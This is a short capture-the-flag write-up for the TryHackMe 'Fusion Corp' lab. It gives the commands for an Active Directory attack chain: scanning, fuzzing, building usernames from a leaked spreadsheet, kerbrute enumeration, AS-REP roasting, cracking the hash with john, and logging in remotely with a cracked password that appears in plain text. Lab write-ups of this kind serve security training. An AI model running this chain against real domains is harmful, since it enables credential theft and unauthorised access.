# Fusion Corp

<figure><img src="../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/room/fusioncorp" %}

***

Let's Scan The Services using nmap first !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo nmap 10.49.174.246 -sV -sC -Pn -T4 -A
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

TEST

<figure><img src="../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

TEST

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
ffuf -u http://10.49.174.246/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

TEST

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
libreoffice --calc employees.ods
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

Save All THe name in The names.txt and Then use the userenumeration Tool !

{% embed url="https://github.com/urbanadventurer/username-anarchy.git" %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
username-anarchy --input-file names.txt > usernames.txt
```
{% endcode %}

TEST

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
kerbrute userenum -d fusion.corp --dc 10.49.174.246 usernames.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

TEST

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-GetNPUsers fusion.corp/ -no-pass -usersfile usernames.txt -dc-ip 10.49.174.246
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

Then Crack The Hash Using john !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

validate the creds !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
crackmapexec smb 10.49.174.246 -u 'lparker' -p '!!abbylvzsvs2k6!'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

TEST

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
evil-winrm -i 10.49.174.246 -u 'lparker' -p '!!abbylvzsvs2k6!'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

